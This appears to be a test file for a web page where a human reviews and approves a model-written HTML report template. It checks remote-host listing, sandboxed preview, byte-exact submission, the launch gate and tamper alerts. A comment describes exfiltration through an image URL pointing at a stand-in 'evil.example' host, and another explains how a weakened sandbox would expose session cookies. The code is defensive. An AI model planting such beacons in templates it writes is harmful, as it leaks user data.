import { afterEach, describe, expect, it, vi } from "vitest";
import { act, screen } from "@testing-library/react";
import { Route, Routes } from "react-router";
import GoLiveReview, { otherOrigins } from "./GoLiveReview.js";
import {
  expectNothingPersisted,
  renderWithProviders,
  stubFetchRoutes,
  type FetchRoutes,
} from "../testUtils.js";

const ID = "1a2b3c4d";
const DETAIL = `GET /api/hypotheses/${ID}`;
const CANDIDATE = `GET /api/hypotheses/${ID}/report-candidate`;
const ACCEPT = `POST /api/hypotheses/${ID}/report-template`;

function detailBody(over: Record<string, unknown> = {}) {
  return {
    hypothesis: {
      id: ID,
      session_name: `hyp-${ID}`,
      session_id: "sess",
      title: "Petrodollar / drone parts",
      title_truncated: false,
      owner: "kai",
      status: "draft",
      status_memory_id: "mem",
      updated_at_ms: 1_780_000_000_000,
      restated_from: null,
    },
    spec_source: "hypothesis-spec-candidate",
    spec_validation: { valid: true, errors: [] },
    report: {
      has_template: false,
      structure_hash: null,
      stripped_count: null,
      updated_at_ms: null,
      drift: null,
      unreadable: false,
      tamper: null,
    },
    ...over,
  };
}

function candidateBody(over: Record<string, unknown> = {}) {
  return {
    memory_id: "cand-7f3a",
    summary: "a chart of the drone-parts basket against Brent",
    html: "<div data-wolf-fallback>no chart</div><section data-wolf-slot=\"analysis\"></section>",
    created_at_ms: 1_780_000_000_000,
    created_by_worker: "",
    created_by_session: "sess-hyp-1a2b3c4d",
    structure_hash: "9f2c1d",
    script_srcs: [],
    remote_origins: [],
    code_origins: [],
    valid: true,
    errors: [],
    tamper: [],
    ...over,
  };
}

async function renderReview(routes: FetchRoutes) {
  const stub = stubFetchRoutes(routes);
  renderWithProviders(
    <Routes>
      <Route path="/hypotheses/:id/golive" element={<GoLiveReview />} />
    </Routes>,
    { route: `/hypotheses/${ID}/golive` },
  );
  // Two independent reads settle: the detail payload and the candidate.
  await act(async () => {
    await Promise.resolve();
    await Promise.resolve();
    await Promise.resolve();
  });
  return stub;
}

const OK: FetchRoutes = {
  [DETAIL]: { json: detailBody() },
  [CANDIDATE]: { json: candidateBody() },
};

/** The `<li>`/`<div>` texts of one list, in order. Never a bare `.length`. */
function textsOf(testId: string): string[] {
  return screen.queryAllByTestId(testId).map((node) => node.textContent ?? "");
}

afterEach(() => {
  vi.unstubAllGlobals();
});

/* ================================================================== */
/* The two URL lists — the criterion revision 5 added                  */
/* ================================================================== */

describe("GoLiveReview: the remote-host lists", () => {
  it("lists an IMG host even though script_srcs is empty", async () => {
    // 🔴 The criterion's own case. A template that exfiltrates through
    // `<img src="https://evil.example/?d=…">` carries no code, so a screen
    // listing script URLs alone shows the approving human NOTHING.
    await renderReview({
      ...OK,
      [CANDIDATE]: {
        json: candidateBody({
          script_srcs: [],
          code_origins: [],
          remote_origins: ["https://evil.example"],
        }),
      },
    });

    expect(textsOf("other-origin")).toEqual(["https://evil.example"]);
    expect(screen.getByTestId("script-srcs-empty")).toBeInTheDocument();
  });

  it("lists script_srcs as RAW urls in document order, never as origins", async () => {
    await renderReview({
      ...OK,
      [CANDIDATE]: {
        json: candidateBody({
          script_srcs: ["https://cdn-z.example/late.css", "https://cdn-a.example/chart.js?v=2"],
          code_origins: ["https://cdn-a.example", "https://cdn-z.example"],
          remote_origins: ["https://cdn-a.example", "https://cdn-z.example"],
        }),
      },
    });

    // Document order and the whole URL, `?v=2` included. An origin list would
    // have collapsed both to bare hosts and lost the path the human is
    // approving as code.
    expect(textsOf("script-src")).toEqual([
      "https://cdn-z.example/late.css",
      "https://cdn-a.example/chart.js?v=2",
    ]);
  });

  it("does NOT call the raw script_srcs list a set of permitted script origins", async () => {
    // 🔴 W21's hand-off: `script_srcs` is not https-only and is not what
    // reaches `script-src` (R155). A heading claiming otherwise would be
    // lying to the human whose click locks the template.
    await renderReview(OK);

    const heading = screen.getByTestId("script-srcs-heading").textContent ?? "";
    expect(heading).toBe("Remote code this template references");
    expect(heading.toLowerCase()).not.toContain("permitted");
  });

  it("shows the CSP's code origins separately from the raw urls, server-derived", async () => {
    // A `data:` URL validates clean, lands in `script_srcs`, and contributes
    // NO origin — `new URL("data:…").origin` is the four characters `null`,
    // a host name in a CSP. The two lists must differ on screen exactly as
    // they differ on the wire.
    await renderReview({
      ...OK,
      [CANDIDATE]: {
        json: candidateBody({
          script_srcs: ["data:text/css,x", "https://cdn-a.example/chart.js"],
          code_origins: ["https://cdn-a.example"],
          remote_origins: ["https://cdn-a.example"],
        }),
      },
    });

    expect(textsOf("script-src")).toEqual(["data:text/css,x", "https://cdn-a.example/chart.js"]);
    expect(textsOf("code-origin")).toEqual(["https://cdn-a.example"]);
    expect(textsOf("code-origin")).not.toContain("null");
  });

  it("renders an EMPTY difference as a plain sentence, never as an error", async () => {
    // § 6b's "subset", corrected from "strict subset": for a template whose
    // only remote URL is a `<script src>` the two sets are EQUAL and this
    // difference is empty. It is the common case.
    await renderReview({
      ...OK,
      [CANDIDATE]: {
        json: candidateBody({
          script_srcs: ["https://cdn-a.example/chart.js"],
          code_origins: ["https://cdn-a.example"],
          remote_origins: ["https://cdn-a.example"],
        }),
      },
    });

    expect(textsOf("other-origin")).toEqual([]);
    expect(screen.getByTestId("other-origins-empty")).toHaveTextContent(
      "Nothing else — every host this template contacts is already listed above as remote code.",
    );
    // Not a Severity, not an Alert, not the error colour.
    expect(screen.queryByTestId("severity")).toBeNull();
  });

  it("states that the inventory is what the validator SAW, not a guarantee", async () => {
    // R173: SVG `fill`/`filter` is a URL channel the walker does not scan.
    // Wording it as a guarantee would be a claim the code cannot keep.
    await renderReview(OK);
    expect(screen.getByTestId("origin-caveat")).toHaveTextContent(
      "This is what the template validator saw. It does not scan hosts reached through SVG fill or filter, so it is an inventory, not a guarantee.",
    );
  });

  it("says so in words when a template references nothing remote at all", async () => {
    await renderReview(OK);
    expect(screen.getByTestId("script-srcs-empty")).toHaveTextContent(
      "None — this template references no remote scripts or stylesheets.",
    );
    expect(screen.getByTestId("code-origins-empty")).toHaveTextContent(
      "None — the frame's script-src will carry no host at all.",
    );
    expect(screen.getByTestId("other-origins-empty")).toHaveTextContent(
      "Nothing else — every host this template contacts is already listed above as remote code.",
    );
  });

  it("shows every remote host across the three lists when a template has both kinds", async () => {
    await renderReview({
      ...OK,
      [CANDIDATE]: {
        json: candidateBody({
          script_srcs: ["https://cdn-a.example/chart.js"],
          code_origins: ["https://cdn-a.example"],
          remote_origins: ["https://cdn-a.example", "https://img-b.example"],
        }),
      },
    });

    expect(textsOf("script-src")).toEqual(["https://cdn-a.example/chart.js"]);
    expect(textsOf("code-origin")).toEqual(["https://cdn-a.example"]);
    expect(textsOf("other-origin")).toEqual(["https://img-b.example"]);
  });
});

describe("otherOrigins", () => {
  it("is remote_origins MINUS the code origins", () => {
    expect(
      otherOrigins({
        remote_origins: ["https://a.example", "https://b.example", "https://c.example"],
        code_origins: ["https://b.example"],
      }),
    ).toEqual(["https://a.example", "https://c.example"]);
  });

  it("is EMPTY when the two sets are equal, which is not an error", () => {
    expect(
      otherOrigins({
        remote_origins: ["https://a.example"],
        code_origins: ["https://a.example"],
      }),
    ).toEqual([]);
  });

  it("keeps a code origin that is somehow absent from remote_origins out of the difference", () => {
    // `frame.ts` asserts the subset holds and throws when it does not, so
    // this cannot reach the wire — but a difference computed the other way
    // round would silently invent a host on the approval screen.
    expect(
      otherOrigins({ remote_origins: [], code_origins: ["https://ghost.example"] }),
    ).toEqual([]);
  });

  it("survives absent lists rather than throwing inside render", () => {
    expect(otherOrigins({})).toEqual([]);
    expect(otherOrigins({ remote_origins: ["https://a.example"] })).toEqual([
      "https://a.example",
    ]);
  });
});

/* ================================================================== */
/* The preview — the real frame, the real CSP, the real sandbox        */
/* ================================================================== */

describe("GoLiveReview: the preview", () => {
  it("renders the candidate in a sandboxed frame with allow-scripts and NOTHING else", async () => {
    // 🔴 `allow-scripts` + `allow-same-origin` together are NO sandbox: the
    // framed document regains Wolf's origin and the script a model wrote
    // reads the session cookie. The rendered ATTRIBUTE is asserted, not a
    // prop, because an added token lands in that same string.
    await renderReview(OK);

    const frame = screen.getByTestId("candidate-preview");
    expect(frame.getAttribute("sandbox")).toBe("allow-scripts");
  });

  it("points the frame at a URL and never at srcdoc", async () => {
    // The CSP is a HEADER, and a header only applies to a document the
    // browser fetched. A `srcdoc` preview would carry no policy at all — and
    // reviewing a preview that differs from production defeats the purpose.
    await renderReview(OK);

    const frame = screen.getByTestId("candidate-preview");
    expect(frame.getAttribute("src")).toBe(`/api/hypotheses/${ID}/report-candidate/frame`);
    expect(frame.hasAttribute("srcdoc")).toBe(false);
  });

  it("NEVER renders the candidate html into this document", async () => {
    // 🔴 The one asymmetry this ticket introduces: the locked frame's bytes
    // never reach the SPA (`composeReportStats` withholds `html`), while the
    // candidate's DO — the accept button has to POST them back. They are safe
    // only inside the sandboxed frame the CSP header applies to, so this page
    // holds them as a STRING and never as markup.
    await renderReview({
      ...OK,
      [CANDIDATE]: {
        json: candidateBody({
          html:
            "<div data-wolf-fallback>x</div>" +
            "<section data-wolf-slot=\"a\"><b data-testid=\"SENTINEL-CANDIDATE-MARKUP\">hi</b></section>",
        }),
      },
    });

    // The element exists in the candidate's bytes and must not exist here.
    expect(screen.queryByTestId("SENTINEL-CANDIDATE-MARKUP")).toBeNull();
    expect(document.querySelectorAll("[data-wolf-slot]")).toHaveLength(0);
    // The DOOR is shut by `ReportPanel.test.tsx`'s repo-wide scan, which
    // walks every file under `web/src` for React's one escape hatch from
    // escaping — this file included. Duplicating it here would be a second
    // copy of a stronger check.
  });

  it("persists nothing to either web storage", async () => {
    // The candidate's HTML and the hypothesis id both pass through this page.
    // Neither belongs in storage readable by any script on the origin.
    await renderReview(OK);
    expectNothingPersisted();
  });

  it("sits inside the real ReportFrameHost, which owns the height and the expand control", async () => {
    await renderReview(OK);
    expect(screen.getByTestId("report-frame-host")).toBeInTheDocument();
    expect(screen.getByTestId("report-expand")).toBeInTheDocument();
  });

  it("does not mount a preview for a candidate that fails validation", async () => {
    await renderReview({
      ...OK,
      [CANDIDATE]: {
        json: candidateBody({
          valid: false,
          structure_hash: null,
          errors: [{ path: "fallback", message: "no [data-wolf-fallback] element" }],
        }),
      },
    });

    expect(screen.queryByTestId("candidate-preview")).toBeNull();
    expect(textsOf("candidate-error")).toEqual(["fallback: no [data-wolf-fallback] element"]);
  });

  it("stamps the candidate as model-authored on the non-alarming provenance ground", async () => {
    // § 2: a candidate is `model` + severity `none`. Calm, never a warning —
    // a proposed template is the system working, not a problem.
    await renderReview(OK);
    expect(screen.getByTestId("provenance")).toHaveAttribute("data-provenance", "model");
    expect(screen.getByTestId("provenance-stamp")).toHaveTextContent("sess-hyp-1a2b3c4d");
  });
});

/* ================================================================== */
/* Accepting                                                           */
/* ================================================================== */

describe("GoLiveReview: accepting the template", () => {
  it("POSTs the candidate's html BYTE FOR BYTE", async () => {
    // 🔴 LEADING AND TRAILING whitespace, deliberately. `parseTemplateContent`
    // hands back everything after line 1 unmodified, so a candidate really can
    // carry a trailing newline — and `structure_hash` is sha256 of exactly
    // these bytes. An earlier version of this fixture had interior whitespace
    // only, so `candidate.html.trim()` passed it (found by a surviving
    // mutation, W14).
    const html = "\n  <div data-wolf-fallback>x</div><section data-wolf-slot=\"a\">  keep   me  </section>\n";
    const stub = await renderReview({
      ...OK,
      [CANDIDATE]: { json: candidateBody({ html }) },
      [ACCEPT]: { status: 201, json: { structure_hash: "9f2c1d", memory_id: "tmpl-1" } },
    });

    await act(async () => {
      (screen.getByTestId("accept-template") as HTMLButtonElement).click();
    });

    expect(stub.countFor(ACCEPT)).toBe(1);
    const init = stub.mock.mock.calls.find((call) => call[1]?.method === "POST")?.[1] as
      | RequestInit
      | undefined;
    // `structure_hash` is sha256 of exactly these bytes: trimming even the
    // whitespace above would lock a template whose hash is not the one the
    // human approved.
    expect(JSON.parse(String(init?.body))).toEqual({ html });
  });

  it("surfaces a 422 as PER-PATH errors, not one flattened sentence", async () => {
    await renderReview({
      ...OK,
      [ACCEPT]: {
        status: 422,
        json: {
          kind: "invalid",
          message: "the report template is not valid",
          details: {
            errors: [
              { path: "script.0", message: "must be https:" },
              { path: "slot.analysis", message: "duplicate slot id" },
            ],
          },
        },
      },
    });

    await act(async () => {
      (screen.getByTestId("accept-template") as HTMLButtonElement).click();
    });

    expect(textsOf("accept-error")).toEqual([
      "script.0: must be https:",
      "slot.analysis: duplicate slot id",
    ]);
  });

  it("shows a 409 as the server's own sentence — a locked template is not invalid", async () => {
    await renderReview({
      ...OK,
      [ACCEPT]: {
        status: 409,
        json: {
          kind: "conflict",
          message:
            "hypothesis 1a2b3c4d already has a locked report template; propose an amendment instead",
        },
      },
    });

    await act(async () => {
      (screen.getByTestId("accept-template") as HTMLButtonElement).click();
    });

    expect(screen.getByTestId("severity")).toHaveTextContent(
      "hypothesis 1a2b3c4d already has a locked report template; propose an amendment instead",
    );
    expect(screen.queryAllByTestId("accept-error")).toEqual([]);
  });

  it("re-reads the detail payload after a successful accept, so the gate can open", async () => {
    let acceptedYet = false;
    const stub = await renderReview({
      [DETAIL]: () => ({
        json: detailBody({
          report: {
            has_template: acceptedYet,
            structure_hash: null,
            stripped_count: null,
            updated_at_ms: null,
            drift: null,
            unreadable: false,
            tamper: null,
          },
        }),
      }),
      [CANDIDATE]: { json: candidateBody() },
      [ACCEPT]: { status: 201, json: { structure_hash: "9f2c1d", memory_id: "tmpl-1" } },
    });

    expect(screen.getByTestId("go-live-button")).toBeDisabled();

    acceptedYet = true;
    await act(async () => {
      (screen.getByTestId("accept-template") as HTMLButtonElement).click();
    });
    await act(async () => {
      await Promise.resolve();
      await Promise.resolve();
    });

    expect(stub.countFor(DETAIL)).toBe(2);
    expect(screen.getByTestId("go-live-button")).toBeEnabled();
  });

  it("offers no accept button when the candidate does not validate", async () => {
    await renderReview({
      ...OK,
      [CANDIDATE]: {
        json: candidateBody({
          valid: false,
          errors: [{ path: "fallback", message: "no [data-wolf-fallback] element" }],
        }),
      },
    });
    expect(screen.queryByTestId("accept-template")).toBeNull();
  });
});

/* ================================================================== */
/* The gate                                                            */
/* ================================================================== */

describe("GoLiveReview: the Go Live gate", () => {
  it("is disabled with the spec valid and no template accepted, naming the reason", async () => {
    await renderReview(OK);
    expect(screen.getByTestId("go-live-button")).toBeDisabled();
    expect(screen.getByTestId("template-blocked")).toBeInTheDocument();
    expect(screen.queryByTestId("spec-errors")).toBeNull();
  });

  it("is disabled with a template accepted and the spec invalid, naming the reason", async () => {
    await renderReview({
      ...OK,
      [DETAIL]: {
        json: detailBody({
          spec_validation: {
            valid: false,
            errors: [{ path: "horizon_days", message: "must be at least 1" }],
          },
          report: {
            has_template: true,
            structure_hash: "9f2c1d",
            stripped_count: 0,
            updated_at_ms: 1_780_000_000_000,
            drift: null,
            unreadable: false,
            tamper: null,
          },
        }),
      },
    });

    expect(screen.getByTestId("go-live-button")).toBeDisabled();
    expect(screen.getByText("horizon_days: must be at least 1")).toBeInTheDocument();
    expect(screen.queryByTestId("template-blocked")).toBeNull();
  });

  it("is enabled only when the spec validates AND a template is accepted", async () => {
    await renderReview({
      ...OK,
      [DETAIL]: {
        json: detailBody({
          report: {
            has_template: true,
            structure_hash: "9f2c1d",
            stripped_count: 0,
            updated_at_ms: 1_780_000_000_000,
            drift: null,
            unreadable: false,
            tamper: null,
          },
        }),
      },
    });

    expect(screen.getByTestId("go-live-button")).toBeEnabled();
  });
});

/* ================================================================== */
/* The states that are not a candidate                                 */
/* ================================================================== */

describe("GoLiveReview: the empty and hostile states", () => {
  it("a 404 is a clear EMPTY STATE, not an error", async () => {
    await renderReview({
      ...OK,
      [CANDIDATE]: {
        status: 404,
        json: {
          kind: "not_found",
          message: "hypothesis 1a2b3c4d has no report candidate",
          details: { id: ID, reason: "no_report_candidate", tamper: [] },
        },
      },
    });

    expect(screen.getByTestId("candidate-empty")).toHaveTextContent(
      "The interview has not produced a report candidate yet. Keep talking to the agent in the conversation rail; it writes one as an interview output.",
    );
    // An empty state carries no severity at all: nothing is wrong.
    expect(screen.queryByTestId("severity")).toBeNull();
    expect(screen.queryByTestId("candidate-preview")).toBeNull();
  });

  it("a 404 whose details name a cross-hypothesis write is NOT presented as empty", async () => {
    // 🔴 "There is no candidate" and "the only candidate was written by
    // something that is not this hypothesis" are different facts, and
    // rendering the second as the first hides an attack behind a benign
    // empty state.
    await renderReview({
      ...OK,
      [CANDIDATE]: {
        status: 404,
        json: {
          kind: "not_found",
          message: "hypothesis 1a2b3c4d has no report candidate",
          details: {
            id: ID,
            reason: "no_report_candidate",
            tamper: [
              {
                reason: "cross_hypothesis_write",
                written_by_worker: "researcher-2b3c4d5e",
                written_by_session: "sess-hyp-2b3c4d5e",
                memory_id: "cand-forged",
              },
            ],
          },
        },
      },
    });

    const alert = screen.getByTestId("severity");
    expect(alert).toHaveAttribute("data-severity", "attacked");
    expect(alert).toHaveTextContent("researcher-2b3c4d5e");
    expect(alert).toHaveTextContent("cand-forged");
  });

  it("shows tamper witnessed alongside a candidate that IS served", async () => {
    await renderReview({
      ...OK,
      [CANDIDATE]: {
        json: candidateBody({
          tamper: [
            {
              reason: "hostile_retraction",
              written_by_worker: "researcher-attacker",
              written_by_session: "sess-attacker",
              memory_id: "cand-7f3a",
            },
          ],
        }),
      },
    });

    expect(screen.getByTestId("severity")).toHaveAttribute("data-severity", "attacked");
    // The candidate still renders: an attack that hides the thing it attacked
    // is the failure the retraction defence exists to prevent.
    expect(screen.getByTestId("candidate-preview")).toBeInTheDocument();
  });

  it("a failure to read the hypothesis costs the page a sentence, not the whole page", async () => {
    await renderReview({
      ...OK,
      [DETAIL]: {
        status: 503,
        json: { kind: "unavailable", message: "host port pool is exhausted" },
      },
    });

    // Verbatim: "host port pool is exhausted" is operational and actionable,
    // and flattening it into "could not load" throws away the only useful
    // part.
    expect(screen.getByTestId("golive-error")).toHaveTextContent("host port pool is exhausted");
    // The candidate read is independent and still rendered.
    expect(screen.getByTestId("candidate-preview")).toBeInTheDocument();
  });

  it("a NON-404 candidate failure is a degraded sentence, NOT the empty state", async () => {
    // 🔴 Only `not_found` is the empty state. An outage rendered as "the
    // interview has not produced one yet" tells the human to go and do work
    // they have already done.
    await renderReview({
      ...OK,
      [CANDIDATE]: {
        status: 503,
        json: { kind: "unavailable", message: "orange is having a moment" },
      },
    });

    expect(screen.queryByTestId("candidate-empty")).toBeNull();
    expect(screen.getByTestId("candidate-failure")).toHaveTextContent(
      "orange is having a moment",
    );
    expect(screen.queryByTestId("candidate-preview")).toBeNull();
  });

  it("shows NO go-live button until the payload it gates on has been read", async () => {
    // `GoLiveButton` treats an unstated field as "no refusal" — right for the
    // detail page, wrong here. An enabled launch button over a gate nobody
    // has read yet is a click the human cannot take back.
    await renderReview({
      ...OK,
      [DETAIL]: { status: 503, json: { kind: "unavailable", message: "orange is down" } },
    });

    expect(screen.queryByTestId("go-live-button")).toBeNull();
  });

  it("links back to the detail page", async () => {
    await renderReview(OK);
    expect(screen.getByTestId("back-to-hypothesis")).toHaveAttribute(
      "href",
      `/hypotheses/${ID}`,
    );
  });
});
